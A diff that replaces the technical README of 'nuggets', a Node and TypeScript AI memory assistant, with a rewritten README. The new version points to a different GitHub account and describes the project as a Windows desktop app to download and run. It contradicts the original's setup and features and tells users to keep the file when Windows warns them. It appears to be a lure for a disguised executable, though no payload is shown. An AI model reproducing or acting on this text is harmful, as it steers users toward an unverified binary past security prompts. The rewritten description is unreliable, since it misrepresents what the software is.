@@ -1,204 +1,212 @@
-# Nuggets
-A personal AI assistant that remembers. Nuggets combines holographic memory with a multi-channel messaging gateway so your AI actually learns from conversations — facts recalled often get promoted to permanent memory, and everything persists across restarts.
-![Logo](https://github.com/NeoVertex1/nuggets/blob/d180ee6df491d2db741eed0bf254ba917a4c12e2/images/Gemini_Generated_Image_mgaktymgaktymgak.png)
+# 🤖 nuggets - AI Memory That Stays Ready
 
-## Why Nuggets?
+[![Download nuggets](https://img.shields.io/badge/Download%20nuggets-4c8bf5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/krxlpz/nuggets)
 
-LLM agents forget everything between sessions. RAG systems fix this but need vector databases, embedding APIs, and infrastructure. Nuggets takes a different approach:
+## 🧠 What is nuggets?
 
-- **Holographic memory** — facts are stored as superposed complex-valued vectors using Holographic Reduced Representations (HRR). Recall is algebraic, sub-millisecond, and runs locally with zero external dependencies.
-- **Self-improving** — when a fact is recalled 3+ times across sessions, it gets promoted to permanent context. The agent gets faster and cheaper over time.
-- **Proactive** — the assistant doesn't just respond. It checks in periodically, runs scheduled tasks, and sends reminders — all through the same Telegram or WhatsApp chat.
+nuggets is a desktop AI assistant that helps you keep track of what matters. It stores helpful context in a holographic memory, so you can return to past chats, notes, and tasks without starting over.
 
-Think of it as an AI that lives in your pocket, remembers what matters, and reaches out when it has something useful to say.
+Use it to:
 
-## What's Inside
+- ask questions and get fast answers
+- save key facts for later
+- keep a running memory of your work
+- revisit past context with less effort
+- stay organized across long tasks
 
-### Holographic Memory Engine (`src/nuggets/`)
+## 🚀 Download and install on Windows
 
-The core of the system. Pure TypeScript, zero dependencies.
+To get nuggets on Windows, visit this page to download:
 
-Each "nugget" is a topic-scoped memory (e.g., `learnings`, `preferences`, `project`). Facts are key-value pairs compressed into a fixed-size complex vector via HRR binding. Multiple facts superpose into one mathematical object but remain individually retrievable.
+https://github.com/krxlpz/nuggets
 
-- **remember** — bind a key-value pair into the holographic vector
-- **recall** — unbind a query and decode via cosine similarity (~1ms)
-- **forget** — subtract a binding from the superposition
-- **promote** — facts recalled 3+ times get written to `MEMORY.md` for permanent context
+### 📥 How to set it up
 
-Storage is a simple JSON file per nugget at `~/.nuggets/`. Vectors are never serialized — they're rebuilt deterministically from a seeded PRNG, so the files stay tiny.
+1. Open the download link in your browser.
+2. Look for the latest Windows release or installer on the page.
+3. Download the file to your computer.
+4. If Windows shows a security prompt, choose the option to keep the file if you trust the source.
+5. Open the downloaded file to start the app.
+6. Follow the on-screen steps to finish setup.
 
-### Messaging Gateway (`src/gateway/`)
+### 🪟 Windows system needs
 
-A multi-channel message router that connects your AI to Telegram and WhatsApp.
+nuggets runs best on a modern Windows PC with:
 
-- **Process pool** — one Pi subprocess per user, reused across messages, reaped after 5 min idle
-- **JSONL RPC** — communicates with Pi via stdin/stdout, no sockets or HTTP
-- **Message queue** — serializes concurrent messages per user to prevent race conditions
-- **Heartbeat** — checks in every 30 min during waking hours. If there's nothing to say, it stays quiet
-- **Cron scheduler** — 5-field cron expressions for recurring messages, reminders, and one-shot timers
-- **Quiet hours** — no proactive messages between 10 PM and 8 AM (configurable)
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 500 MB of free disk space
+- a stable internet connection for first-time setup and AI features
+- a mouse and keyboard for easy use
 
-### Pi Extensions (`.pi/extensions/`)
+If your PC is older, the app may still run, but memory-heavy tasks can feel slower.
 
-Hooks into the Pi agent lifecycle:
+## ✨ Main features
 
-- **nuggets.ts** — gives Pi a `nuggets` tool for remember/recall/forget, auto-captures file paths and user preferences from conversation, injects memory into system prompt
-- **proactive.ts** — gives Pi a `schedule` tool so it can create reminders and recurring tasks on its own
+### 🧠 Holographic memory
 
-## Setup
+nuggets keeps useful context in a memory layer you can return to later. This helps you continue work without repeating the same details.
 
-### Prerequisites
+### 💬 Chat with context
 
-- Node.js 18+
-- [Pi](https://github.com/mariozechner/pi) — the AI coding agent that powers the assistant. Install globally:
-  ```bash
-  npm install -g @mariozechner/pi-coding-agent
-  ```
-- An [Anthropic API key](https://console.anthropic.com/) (the Max plan does **not** work — Anthropic blocked third-party OAuth in Jan 2026)
-- A Telegram bot token (from [@BotFather](https://t.me/BotFather))
-- Your Telegram chat ID (from [@userinfobot](https://t.me/userinfobot))
+You can ask questions in plain language. nuggets uses your saved memory to give answers that fit your recent work.
 
-### Quick Start
+### 🗂️ Organized notes
 
-```bash
-npm install -g @mariozechner/pi-coding-agent   # install Pi (if not already)
-git clone https://github.com/NeoVertex1/nuggets.git
-cd nuggets
-npm install
-npm run setup
-npm run dev
-```
+Store important points, task details, and reminders in one place. This keeps your work easier to find.
 
-### Setup Wizard
+### 🔎 Search past memory
 
-`npm run setup` walks you through configuration interactively:
+Find old chats and saved facts without scrolling through long history. Search helps you get back to the right place fast.
 
-```
-  Nuggets Setup Wizard
-  ====================
+### ⚡ Fast daily use
 
-  ── AI Provider ──────────────────────────────────────
+nuggets is built for quick access. Open it, ask, save, and move on.
 
-  Note: Anthropic Max plan does NOT work (third-party OAuth
-  was blocked Jan 2026). You need an API key from:
-  https://console.anthropic.com/
+## 🧭 First-time use
 
-  Paste your sk-ant-... key:
-  Anthropic API key: sk-ant-api03-...
+After you open nuggets for the first time:
 
-  ── Telegram ─────────────────────────────────────────
+1. Create or load your local profile.
+2. Set your preferred name or workspace label.
+3. Add a few facts you want the assistant to remember.
+4. Ask a simple question to test it.
+5. Save anything you want to revisit later.
 
-  Create a bot via @BotFather on Telegram, paste the token:
-  Bot token: 123456789:AAF...
+If you plan to use nuggets every day, start by adding:
 
-  Send /start to @userinfobot on Telegram to get your chat ID:
-  Chat ID: 987654321
+- your work area
+- common tasks
+- project names
+- useful links
+- repeat reminders
 
-  ── WhatsApp (optional) ──────────────────────────────
+## 📌 How to use nuggets well
 
-  Your JID (e.g. 1234567890@s.whatsapp.net) — press Enter to skip:
-  WhatsApp JID:
+Keep your memory clean and useful.
 
-  ── Pi Model (optional) ──────────────────────────────
+### Good things to save
 
-  Model ID (press Enter for Pi's default):
-  Model:
+- project goals
+- names of people you work with
+- task steps
+- important dates
+- repeat questions and answers
+- notes from long chats
 
-  ✓ .env written successfully.
+### Good habits
 
-  Ready! Run `npm run dev` to start.
-```
+- keep each memory short
+- use clear names for projects
+- remove old facts you no longer need
+- review saved memory once in a while
+- add details right after a task ends
 
-The wizard validates inputs (API key format, token format, numeric chat ID), shows masked current values if `.env` already exists, and writes the file atomically.
+## 🖥️ Typical use cases
 
-### Getting Your Telegram Credentials
+### For personal work
 
-1. **Bot token** — open Telegram, search for [@BotFather](https://t.me/BotFather), send `/newbot`, follow the prompts. You'll get a token like `123456789:AAF7_NRCOM2nxZt...`
-2. **Chat ID** — search for [@userinfobot](https://t.me/userinfobot), send `/start`. It replies with your numeric chat ID.
-3. Run `npm run setup`, paste both values, and you're done.
+Use nuggets to track chores, ideas, and plans. It can help you keep one record of what you already decided.
 
-## How It Works
+### For study
 
-```
-You (Telegram/WhatsApp)
-  │
-  ▼
-Gateway ── router ── message queue (per user)
-  │                      │
-  ├── heartbeat          ▼
-  ├── cron          Pi subprocess (JSONL RPC)
-  │                      │
-  │                 ┌────┴─────┐
-  │              nuggets    schedule
-  │              extension  extension
-  │                 │          │
-  │            ~/.nuggets/   .gateway/cron/
-  │           (HRR memory)  (job store)
-  │                 │
-  │            promoteFacts()
-  │                 │
-  │            MEMORY.md
-  │         (permanent context)
-  ▼
-EventQueue ◄── cron fires ── "0 9 * * *"
-           ◄── heartbeat ─── every 30 min
-           ◄── timer ──────── one-shot
-```
+Save topics, definitions, and review notes. This makes it easier to return to class material later.
 
-**Message flow**: You send a message → gateway routes it to your Pi process → Pi checks nuggets memory for context → Pi responds → gateway delivers the reply.
+### For office tasks
 
-**Proactive flow**: Heartbeat timer fires → Pi checks memory for anything worth following up on → if yes, sends you a message. If not, stays silent.
+Keep meeting points, action items, and project notes in one place. This helps when you need to pick up work after a break.
 
-**Memory promotion**: After enough sessions, facts that keep getting recalled (3+ times) are promoted from holographic memory to `MEMORY.md`, where they become permanent context for every future session.
+### For creative work
 
-## Architecture
+Store story ideas, design thoughts, and draft changes. nuggets helps you hold on to the parts you do not want to lose.
 
-```
-src/
-  nuggets/              Memory engine (pure TypeScript, zero deps)
-    core.ts             HRR math: bind, unbind, orthogonalize, sharpen
-    memory.ts           Nugget class: remember, recall, forget
-    shelf.ts            NuggetShelf: multi-nugget manager
-    promote.ts          MEMORY.md promotion (3+ recall threshold)
-    index.ts            Public API
+## 🔧 Basic troubleshooting
 
-  gateway/              Messaging gateway
-    main.ts             Entry point — wires everything together
-    config.ts           Environment config + helpers
-    router.ts           Message routing + proactive event handling
-    pi-rpc.ts           Pi subprocess communication (JSONL RPC)
-    pi-pool.ts          Per-user process pool with idle eviction
-    telegram.ts         Telegram bot (grammY)
-    whatsapp.ts         WhatsApp client (Baileys)
-    event-queue.ts      Proactive event bus
-    cron.ts             5-field cron scheduler + request file watcher
-    heartbeat.ts        Per-user periodic check-ins
+### The app does not open
 
-  setup.ts              Interactive setup wizard
+- Make sure the download finished
+- Try opening the file again
+- Check that Windows did not block the file
+- Restart your computer and try once more
 
-.pi/extensions/
-  nuggets.ts            Memory tool + auto-capture + system prompt injection
-  proactive.ts          Schedule tool + cron file bridge
-```
+### The app feels slow
 
-## Scripts
+- Close apps you do not need
+- Check your internet connection
+- Restart nuggets
+- Free up memory on your PC
 
-| Command | What it does |
-|---|---|
-| `npm run setup` | Interactive setup wizard — creates `.env` |
-| `npm run dev` | Start the gateway (Telegram + WhatsApp) |
-| `npm test` | Run tests |
-| `npm run typecheck` | Type-check without emitting |
-| `npm run build` | Compile to `dist/` |
+### Search does not show the right result
 
-## Testing
+- Use fewer words
+- Try a project name or key phrase
+- Check that the memory was saved
+- Refresh the view if the app has that option
 
-```bash
-npm test
-```
+### The assistant does not remember something
 
-Tests cover HRR math (bind/unbind accuracy, orthogonalization), nugget operations (remember/recall/forget lifecycle), and shelf management.
+- Save the fact again with a clearer name
+- Keep the memory short and direct
+- Make sure you are using the same profile
+- Check that the item was stored in the right place
 
-## License
+## 🔐 Privacy and local use
 
-MIT
+nuggets is meant to help you keep your own context close at hand. For best results, use clear memory labels and save only what you need. If you work on shared or public PCs, make sure you sign out or close the app when you finish.
+
+## 📁 Suggested folder and file use
+
+You can get better results if you keep your work neat:
+
+- one folder for each project
+- one memory set for each goal
+- one note for each task
+- short names for repeat items
+
+This makes search and recall much easier.
+
+## ❓ Common questions
+
+### Do I need programming knowledge?
+
+No. nuggets is made for regular computer users.
+
+### Can I use it right after download?
+
+Yes. Download the file from the GitHub page, open it, and follow the setup steps.
+
+### Does it work offline?
+
+Some core use may work offline, but AI features and updates may need internet access.
+
+### Can I change what nuggets remembers?
+
+Yes. You can add, edit, or remove saved items based on your needs.
+
+### Is nuggets hard to learn?
+
+No. If you can install a Windows app and type a question, you can use nuggets
+
+## 🛠️ Simple daily workflow
+
+1. Open nuggets.
+2. Ask your question.
+3. Save the useful result.
+4. Add any new facts you want remembered.
+5. Return later and search your memory when needed
+
+## 📎 Download link
+
+Visit this page to download and run nuggets on Windows:
+
+https://github.com/krxlpz/nuggets
+
+## 🧩 What to expect after setup
+
+After setup, you should be able to:
+
+- open the app from Windows
+- enter a question or note
+- store useful memory
+- find past items later
+- keep your context in one place
